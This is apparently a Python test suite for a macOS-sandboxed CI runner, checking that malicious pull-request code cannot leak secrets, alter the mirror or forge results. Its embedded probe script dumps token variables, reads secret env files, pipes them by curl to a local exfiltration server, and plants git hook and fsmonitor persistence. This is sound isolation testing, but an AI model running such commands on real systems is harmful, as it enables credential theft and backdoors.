"""verify.py's runner tests that apply the macOS sandbox themselves: a sandboxed job can't nest another sandbox, so
these run on the native lane (scripts/verify-suites.json `native`), on a host without the runner's sandbox.
Run: python3 -m unittest skillsets/repo-bootstrap/shared/verify/scripts/tests/test_verify_sandbox.py"""
import argparse
import hashlib
import http.server
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
_spec = importlib.util.spec_from_file_location("verify_test_helpers", HERE / "test_verify.py")
_helpers = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_helpers)
verify, git, make_repo, quiet = _helpers.verify, _helpers.git, _helpers.make_repo, _helpers.quiet


PROBE = """#!/bin/sh
MIRROR='@MIRROR@'
env | grep -E '^(GH_TOKEN|GITHUB_TOKEN|AWS_SECRET_ACCESS_KEY|DATABASE_URL|HOME)='
cat '@HOME_CANARY@' '@TMP_CANARY@' '@VF_CANARY@' 2>&1
cat '@RUNNER_HOME@/env/acme__app.env' "$MIRROR/config" 2>&1
curl -s -m 3 'http://127.0.0.1:@PORT@/' 2>&1
env | curl -s -m 3 --data-binary @- 'http://127.0.0.1:@EXFIL@/' >/dev/null 2>&1
cat '@RUNNER_HOME@/env/acme__app.env' 2>/dev/null | curl -s -m 3 --data-binary @- 'http://127.0.0.1:@EXFIL@/' >/dev/null 2>&1
printf '#!/bin/sh\\ntouch @MARKER@\\n' > "$MIRROR/hooks/reference-transaction" 2>&1 && chmod +x "$MIRROR/hooks/reference-transaction"
git config core.fsmonitor 'touch @MARKER@' 2>&1
mkdir -p .verify/runs && echo '{"verdict": "pass", "forged": true}' > ".verify/runs/$VERIFY_SHA.json"
echo forged > '@MARKER@' 2>&1
echo "PROBE-RAN-$1"
exit 0
"""


class CanaryHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"PORT-CANARY")

    def log_message(self, *a):
        pass


class ExfilHandler(CanaryHandler):
    """Stands in for any server on the internet: records whatever a job sends it."""
    received = []

    def do_POST(self):
        self.received.append(self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode(errors="replace"))
        self.send_response(200)
        self.end_headers()


def tree_digest(root):
    h = hashlib.sha256()
    for p in sorted(Path(root).rglob("*")):
        h.update(str(p.relative_to(root)).encode())
        if p.is_file():
            h.update(p.read_bytes())
    return h.hexdigest()


@unittest.skipUnless(sys.platform == "darwin" and Path(verify.SANDBOX_EXEC).exists(), "macOS sandbox-exec only")
class RunnerIsolation(unittest.TestCase):
    """A malicious same-repo or fork PR, run through run_job: nothing secret leaves, nothing outside its job changes,
    and the base branch's config runs. Each probe is also run unsandboxed first, so a blocked probe means something."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="verify-iso-")).resolve()
        self.runner_home = self.tmp / "runner"
        (self.runner_home / "env").mkdir(parents=True)
        self.saved = verify.RUNNER_HOME, dict(os.environ), verify.DISK_FLOOR_GB
        verify.RUNNER_HOME = self.runner_home
        verify.DISK_FLOOR_GB = 0  # these jobs are a few KB; the floor is for real checkouts
        self.home_canary = Path.home() / ".cache" / f"verify-test-canary-{os.getpid()}.txt"
        self.home_canary.parent.mkdir(exist_ok=True)
        self.home_canary.write_text("HOME-CANARY\n")
        # Keep fixture setup inside an outer runner's approved TMPDIR. This
        # canary is still outside the nested PR job and must remain unreadable.
        self.tmp_canary = Path(tempfile.gettempdir()).resolve() / f"verify-test-canary-{os.getpid()}.txt"
        self.tmp_canary.write_text("TMP-CANARY\n")
        (self.tmp / "vf-canary.txt").write_text("VF-CANARY\n")
        self.marker = self.tmp / "marker"
        self.srv = http.server.HTTPServer(("127.0.0.1", 0), CanaryHandler)
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        ExfilHandler.received = []
        self.exfil = http.server.HTTPServer(("127.0.0.1", 0), ExfilHandler)
        threading.Thread(target=self.exfil.serve_forever, daemon=True).start()
        os.environ.update(GH_TOKEN="canary-runner-gh-1", AWS_SECRET_ACCESS_KEY="canary-runner-aws-1")
        (self.runner_home / "env/acme__app.env").write_text("SECRET_API_KEY=canary-secret-1\nGH_TOKEN=canary-envfile-gh-1\n")
        (self.runner_home / "env/acme__app.pr.env").write_text("DATABASE_URL=pr-visible-db-1\n")
        base_cfg = {"version": 1, "setup": "sh probe.sh setup", "stages": {
            "static": {"run": "sh probe.sh static"}, "unit": {"run": "git status >/dev/null 2>&1; sh probe.sh unit"},
            "integration": {"run": "sh probe.sh integration", "env": ["DATABASE_URL", "GH_TOKEN"]},
            "rehearsal": {"run": "sh probe.sh rehearsal", "env": ["SECRET_API_KEY"]},
            **{s: {"run": None, "na": "test"} for s in ("journeys", "evals")}}}
        origin = self.origin = make_repo({"probe.sh": "echo benign\n"}, base_cfg)
        self.mirror = self.tmp / "mirror.git"
        git(origin, "checkout", "-q", "-b", "pr")
        probe = PROBE
        for k, v in {"MIRROR": self.mirror, "HOME_CANARY": self.home_canary, "TMP_CANARY": self.tmp_canary,
                     "VF_CANARY": self.tmp / "vf-canary.txt", "RUNNER_HOME": self.runner_home,
                     "PORT": self.srv.server_address[1], "EXFIL": self.exfil.server_address[1],
                     "MARKER": self.marker}.items():
            probe = probe.replace(f"@{k}@", str(v))
        (origin / "probe.sh").write_text(probe)
        (origin / ".verify/config.json").write_text(json.dumps({"version": 1, "stages": {
            s: {"run": "true"} for s in verify.PER_CHANGE}}))
        git(origin, "commit", "-qam", "malicious")
        self.sha = subprocess.run(["git", "-C", str(origin), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
        subprocess.run(["git", "clone", "-q", "--mirror", str(origin), str(self.mirror)], check=True)
        self.probe = probe

    def tearDown(self):
        verify.RUNNER_HOME, verify.DISK_FLOOR_GB = self.saved[0], self.saved[2]
        os.environ.clear()
        os.environ.update(self.saved[1])
        for s in (self.srv, self.exfil):
            s.shutdown()
            s.server_close()
        self.home_canary.unlink(missing_ok=True)
        self.tmp_canary.unlink(missing_ok=True)
        shutil.rmtree(self.tmp, ignore_errors=True)

    CANARIES = ("HOME-CANARY", "TMP-CANARY", "VF-CANARY", "PORT-CANARY", "canary-runner-gh-1", "canary-runner-aws-1",
                "canary-envfile-gh-1", "canary-secret-1", "mirror = true")

    def test_every_probe_works_without_the_sandbox(self):
        mirror_copy = self.tmp / "mirror-copy.git"
        shutil.copytree(self.mirror, mirror_copy)
        clone = self.tmp / "control"
        subprocess.run(["git", "clone", "-q", str(mirror_copy), str(clone)], check=True)
        script = self.probe.replace(str(self.mirror), str(mirror_copy))
        # What an unisolated job would inherit: the runner's environment (here only its canaries, never the real one).
        env = {"PATH": os.environ["PATH"], "HOME": str(Path.home()), "VERIFY_SHA": self.sha,
               "GH_TOKEN": "canary-runner-gh-1", "AWS_SECRET_ACCESS_KEY": "canary-runner-aws-1"}
        rc, out = verify.sh(["/bin/sh", "-c", script, "probe", "control"], cwd=clone, env=env, timeout=60)
        for c in self.CANARIES:
            self.assertTrue(c in out, f"control could not reach {c}")
        self.assertTrue("canary-secret-1" in "".join(ExfilHandler.received), "control could not send out a secret")
        self.assertTrue(self.marker.exists())
        self.marker.unlink()
        verify.git(clone, "status")  # what the planted fsmonitor does to anyone running git there afterwards
        self.assertTrue(self.marker.exists(), "fsmonitor plant did not fire in the control")
        self.assertNotEqual(tree_digest(mirror_copy), tree_digest(self.mirror))

    def run_pr(self, fork):
        posts = []
        # The exfil port stands for open egress: the job may reach it, as it may reach the internet.
        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
        before = tree_digest(self.mirror)
        rc, out = quiet(verify.run_job, "acme/app", self.mirror, self.sha, "main", "PR #1", args,
                        lambda c, s, d: posts.append((c, s, d)) or True, fork)
        art = (self.runner_home / "runs/acme__app" / f"{self.sha}.json").read_text()
        self.assertEqual(rc, "done", out)
        self.assertEqual(tree_digest(self.mirror), before, "PR code changed the runner's mirror")
        self.assertFalse(self.marker.exists(), "PR code wrote outside its job, or the runner ran its git plant")
        sent = "".join(ExfilHandler.received)
        self.assertTrue(sent, "the job never reached the exfil server, so the test proves nothing")
        seen = out + art + json.dumps(posts) + sent
        for c in self.CANARIES:
            self.assertFalse(c in seen, f"{c} leaked")
        self.assertIn("PROBE-RAN-static", art)  # the base branch's config ran, not the PR's `run: "true"`
        self.assertNotIn('"forged"', art)
        final = posts[-1]
        self.assertEqual(final[0], "verify")
        self.assertIn("ran main's config, not this PR's edit", final[2])
        return json.loads(art), posts

    def test_same_repo_pr_gets_no_secrets_and_cannot_send_one_out(self):
        art, _ = self.run_pr(fork=False)
        self.assertTrue("pr-visible-db-1" in "".join(ExfilHandler.received), "PR-visible values should reach PR code")
        stages = {s["stage"]: s for s in art["stages"]}
        self.assertTrue(art["sandboxed"])
        self.assertEqual(stages["integration"]["status"], "fail")  # GH_TOKEN is required but never passed
        self.assertIn("missing required env: GH_TOKEN", stages["integration"]["detail"])
        self.assertIn("DATABASE_URL=***", stages["static"]["tail"])
        # A stage that needs a secret is not verified on a PR (missing), rather than reported broken (fail).
        self.assertEqual((stages["rehearsal"]["status"], "SECRET_API_KEY" in stages["rehearsal"]["detail"]), ("missing", True))

    def test_fork_pr_gets_no_env_file(self):
        art, _ = self.run_pr(fork=True)
        self.assertNotIn("DATABASE_URL=", json.dumps(art))
        self.assertFalse("pr-visible-db-1" in "".join(ExfilHandler.received))
        self.assertIn("DATABASE_URL", {s["stage"]: s for s in art["stages"]}["integration"]["detail"])

    def test_owner_branch_job_gets_the_secrets(self):
        # Positive control for the split: merged code on an owner-chosen branch does get <slug>.env.
        git(self.origin, "checkout", "-q", "-b", "trusted", "main")
        (self.origin / "probe.sh").write_text(self.probe)
        git(self.origin, "commit", "-qam", "probe on a trusted branch")
        sha = subprocess.run(["git", "-C", str(self.origin), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
        mirror = self.tmp / "trusted.git"
        subprocess.run(["git", "clone", "-q", "--mirror", str(self.origin), str(mirror)], check=True)
        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
        rc, _ = quiet(verify.run_job, "acme/app", mirror, sha, None, "trusted", args, lambda c, s, d: True, False, "branch")
        self.assertEqual(rc, "done")
        self.assertTrue("SECRET_API_KEY=canary-secret-1" in "".join(ExfilHandler.received), "branch job lacked its secret")
        art = json.loads((self.runner_home / "runs/acme__app" / f"{sha}.json").read_text())
        self.assertEqual(art["kind"], "branch")
        self.assertEqual({s["stage"]: s["status"] for s in art["stages"]}["rehearsal"], "pass")

    def test_a_job_without_a_known_base_never_gets_secrets(self):
        # run_job defaults to a PR job; a missing, empty or unknown base is refused, never treated as a branch job.
        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
        calls = [(None, "PR #1", ()), ("", "PR #1", ()), ("nope", "PR #1", ()), ("../main", "PR #1", ()),
                 (["main"], "PR #1", ()),
                 (None, "main", (False, "branch")),  # a branch job whose SHA is not that branch's head
                 ("main", "pr", (False, "branch")),  # a branch job never has a base
                 (None, "pr", (True, "branch"))]     # nor comes from a fork
        for base, label, extra in calls:
            posts = []
            rc, out = quiet(verify.run_job, "acme/app", self.mirror, self.sha, base, label, args,
                            lambda c, s, d: posts.append((c, s, d)) or True, *extra)
            self.assertEqual((rc, posts), ("error", []), f"{base!r} {label} {extra}: {out}")
        self.assertFalse(self.marker.exists())
        self.assertFalse((self.runner_home / "runs").exists())
        self.assertEqual(ExfilHandler.received, [])

    def serve(self, prs, branch=None, pr=None):
        """Drive the real dispatch (serve_repo -> pending_jobs -> run_job) against a fake `gh` that lists `prs`."""
        bin_dir = self.tmp / "bin"
        bin_dir.mkdir(exist_ok=True)
        (self.tmp / "prs.json").write_text(json.dumps(prs))
        log = self.tmp / "gh.log"
        log.write_text("")
        fake = bin_dir / "gh"
        fake.write_text(f"#!{sys.executable}\n"
                        "import json, sys\n"
                        f"open({str(log)!r}, 'a').write(json.dumps(sys.argv[1:]) + '\\n')\n"
                        f"prs = json.load(open({str(self.tmp / 'prs.json')!r}))\n"
                        "if sys.argv[1:3] == ['pr', 'list']:\n"
                        "    print(json.dumps(prs))\n"
                        "elif sys.argv[1:3] == ['pr', 'view']:\n"
                        "    p = next((p for p in prs if isinstance(p, dict) and p.get('number') == int(sys.argv[3])), prs[0] if prs else {})\n"
                        "    print(json.dumps({'state': 'OPEN', **p}))\n"
                        "else:\n"
                        "    print('{}')\n")
        fake.chmod(0o755)
        mirror = self.runner_home / "mirrors/acme__app.git"
        if not mirror.exists():
            subprocess.run(["git", "clone", "-q", "--mirror", str(self.origin), str(mirror)], check=True)
        os.environ["PATH"] = f"{bin_dir}:{os.environ['PATH']}"
        args = argparse.Namespace(allow_forks=True, branch=branch, pr=pr, max_jobs=50, stale_hours=6, rerun=None,
                                  unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
        try:
            _, out = quiet(verify.serve_repo, "acme/app", args)
        finally:
            os.environ["PATH"] = self.saved[1]["PATH"]
        calls = [json.loads(l) for l in log.read_text().splitlines()]
        return out, [c for c in calls if c[:3] == ["api", "-X", "POST"]]

    def test_selected_pr_dispatch_runs_only_that_pr_without_secrets(self):
        prs = [{"number": n, "headRefOid": self.sha, "baseRefName": "main", "isCrossRepository": False}
               for n in (11, 22)]
        out, posts = self.serve(prs, pr=22)
        self.assertEqual(set(re.findall(r"\[serve\] acme/app (PR #\d+) \w{9} running", out)), {"PR #22"}, out)
        calls = [json.loads(line) for line in (self.tmp / 'gh.log').read_text().splitlines()]
        self.assertEqual([call[:3] for call in calls if call[:1] == ['pr']], [['pr', 'view', '22']])
        self.assertTrue(posts)
        sent = ''.join(ExfilHandler.received)
        self.assertTrue(sent, 'selected PR never reached the probe server')
        for canary in self.CANARIES:
            self.assertNotIn(canary, out + json.dumps(posts) + sent)
        art = json.loads((self.runner_home / 'runs/acme__app' / (self.sha + '.json')).read_text())
        self.assertEqual((art['kind'], art['label'], art['base']), ('pr', 'PR #22', 'main'))

    def test_selected_pr_wrong_target_or_closed_reply_refuses_dispatch(self):
        for reply in ({'number': 11, 'state': 'OPEN'}, {'number': 22, 'state': 'CLOSED'}, {'number': '22', 'state': 'OPEN'}):
            with self.subTest(reply=reply):
                with self.assertRaisesRegex(RuntimeError, 'does not identify that open PR'):
                    self.serve([{**reply, 'headRefOid': self.sha, 'baseRefName': 'main', 'isCrossRepository': False}], pr=22)
                self.assertFalse(self.marker.exists())
                calls = [json.loads(line) for line in (self.tmp / 'gh.log').read_text().splitlines()]
                self.assertFalse(any(call[:3] == ['api', '-X', 'POST'] for call in calls))

    def test_selected_pr_invalid_number_refuses_before_forge_read(self):
        for number in (0, -1, True):
            with self.subTest(number=number):
                with self.assertRaisesRegex(RuntimeError, 'positive PR number'):
                    self.serve([], pr=number)
                self.assertEqual((self.tmp / 'gh.log').read_text(), '')
                self.assertFalse(self.marker.exists())

    def test_serve_dispatch_never_gives_a_pr_the_secrets(self):
        sha = self.sha
        prs = [{"number": 1, "headRefOid": sha, "baseRefName": "main", "isCrossRepository": False},
               {"number": 2, "headRefOid": sha, "baseRefName": "", "isCrossRepository": False},
               {"number": 3, "headRefOid": sha, "isCrossRepository": False},
               {"number": 4, "headRefOid": sha, "baseRefName": None, "isCrossRepository": False},
               {"number": 5, "headRefOid": sha, "baseRefName": "../main", "isCrossRepository": False},
               {"number": 6, "headRefOid": sha, "baseRefName": "refs/heads/main", "isCrossRepository": False},
               {"number": 7, "headRefOid": sha, "baseRefName": "nope", "isCrossRepository": False},
               {"number": 8, "headRefOid": sha, "baseRefName": ["main"], "isCrossRepository": False},
               {"number": 9, "headRefOid": "HEAD", "baseRefName": "main", "isCrossRepository": False},
               {"number": 10, "headRefOid": sha, "baseRefName": "main", "isCrossRepository": True},
               {"number": 11, "headRefOid": sha, "baseRefName": "main"},
               "not a PR"]
        out, posts = self.serve(prs)
        ran = set(re.findall(r"\[serve\] acme/app (PR #\d+) \w{9} running", out))
        self.assertEqual(ran, {"PR #1", "PR #10", "PR #11"}, out)
        for n in range(2, 10):
            self.assertIn(f"PR #{n}: head or base branch missing or unknown; not running", out)
        self.assertTrue(posts, "dispatch posted nothing, so the test proves nothing")
        sent = "".join(ExfilHandler.received)
        self.assertTrue(sent, "no job reached the exfil server, so the test proves nothing")
        for c in self.CANARIES:
            self.assertFalse(c in out + json.dumps(posts) + sent, f"{c} leaked through dispatch")
        art = json.loads((self.runner_home / "runs/acme__app" / f"{sha}.json").read_text())
        self.assertEqual((art["kind"], art["base"]), ("pr", "main"))
        # A PR that does not say whether it is a fork is treated as one: not even PR-visible values reach it.
        ExfilHandler.received = []
        out, _ = self.serve([prs[10]])
        self.assertIn("PR #11", "".join(re.findall(r"\[serve\] acme/app (PR #\d+) \w{9} running", out)), out)
        self.assertTrue(ExfilHandler.received)
        self.assertNotIn("pr-visible-db-1", "".join(ExfilHandler.received))
        # Positive control through the same dispatch: an owner-listed branch does get the secret.
        git(self.origin, "checkout", "-q", "-b", "trusted", "main")
        (self.origin / "probe.sh").write_text(self.probe)
        git(self.origin, "commit", "-qam", "probe on a trusted branch")
        ExfilHandler.received = []
        out, _ = self.serve([], branch=["trusted"])
        self.assertRegex(out, r"\[serve\] acme/app trusted \w{9} running")
        self.assertTrue("canary-secret-1" in "".join(ExfilHandler.received), "branch job through dispatch lacked its secret")

    def test_no_sandbox_means_no_pr_code_runs(self):
        posts = []
        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=None)
        saved, verify.SANDBOX_EXEC = verify.SANDBOX_EXEC, str(self.tmp / "no-sandbox-exec")
        try:
            rc, out = quiet(verify.run_job, "acme/app", self.mirror, self.sha, "main", "PR #1", args,
                            lambda c, s, d: posts.append((c, s, d)) or True)
        finally:
            verify.SANDBOX_EXEC = saved
        self.assertEqual(rc, "error")
        self.assertIn("not running PR code", out)
        self.assertEqual(posts, [])
        self.assertFalse(self.marker.exists())

    def test_base_without_a_config_runs_nothing(self):
        posts = []
        empty = make_repo({"probe.sh": "echo benign\n"})
        git(empty, "checkout", "-q", "-b", "pr")
        (empty / "probe.sh").write_text(self.probe)
        (empty / ".verify").mkdir()
        (empty / ".verify/config.json").write_text(json.dumps({"setup": "sh probe.sh setup", "stages": {}}))
        git(empty, "add", "-A")
        git(empty, "commit", "-qm", "adds a config")
        sha = subprocess.run(["git", "-C", str(empty), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
        mirror = self.tmp / "empty.git"
        subprocess.run(["git", "clone", "-q", "--mirror", str(empty), str(mirror)], check=True)
        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=None)
        rc, _ = quiet(verify.run_job, "acme/app", mirror, sha, "main", "PR #2", args,
                      lambda c, s, d: posts.append((c, s, d)) or True)
        self.assertEqual(rc, "done")
        self.assertEqual(posts, [("verify", "missing", "no .verify/config.json on main yet; merge one there first")])
        self.assertFalse(self.marker.exists())


@unittest.skipUnless(sys.platform == "darwin" and Path(verify.SANDBOX_EXEC).exists(), "macOS sandbox-exec only")
class PinnedVerifierSandbox(unittest.TestCase):
    """In the sandbox, nothing a job runs (setup, an earlier stage, a process it leaves behind) can rewrite, replace
    or rename a pinned verifier path or a directory above it; everything else in the checkout stays writable."""

    def test_setup_cannot_swap_the_helper_a_later_stage_runs(self):
        tmp = Path(tempfile.mkdtemp(prefix="verify-pinsb-")).resolve()
        saved = verify.RUNNER_HOME, verify.DISK_FLOOR_GB
        verify.RUNNER_HOME, verify.DISK_FLOOR_GB = tmp / "runner", 0
        try:
            swap = ("echo 'exit 0' > scripts/check.sh; mv scripts scripts.old; mkdir -p scripts; "
                    "echo 'exit 0' > scripts/check.sh; echo made > written-at-root; true")
            cfg = {"version": 1, "verifier": ["scripts/check.sh"], "setup": swap,
                   "stages": {"unit": {"run": "test -f written-at-root && sh scripts/check.sh"},
                              **{s: {"run": None, "na": "test"} for s in verify.PER_CHANGE if s != "unit"}}}
            origin = make_repo({"scripts/check.sh": "echo base-helper-ran; exit 1\n"}, cfg)
            git(origin, "checkout", "-q", "-b", "pr")
            (origin / "README").write_text("pr\n")
            git(origin, "add", "-A")
            git(origin, "commit", "-qm", "pr")
            sha = subprocess.run(["git", "-C", str(origin), "rev-parse", "HEAD"], capture_output=True,
                                 text=True).stdout.strip()
            mirror = tmp / "mirror.git"
            subprocess.run(["git", "clone", "-q", "--mirror", str(origin), str(mirror)], check=True)
            posts = []
            args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=None)
            rc, out = quiet(verify.run_job, "acme/app", mirror, sha, "main", "PR #1", args,
                            lambda c, s, d: posts.append((c, s, d)) or True)
            self.assertEqual(rc, "done", out)
            art = json.loads((verify.RUNNER_HOME / "runs/acme__app" / f"{sha}.json").read_text())
            unit = {s["stage"]: s for s in art["stages"]}["unit"]
            self.assertEqual(unit["status"], "fail", unit)
            self.assertIn("base-helper-ran", unit["tail"])  # the root stayed writable, the helper did not
        finally:
            verify.RUNNER_HOME, verify.DISK_FLOOR_GB = saved
            shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
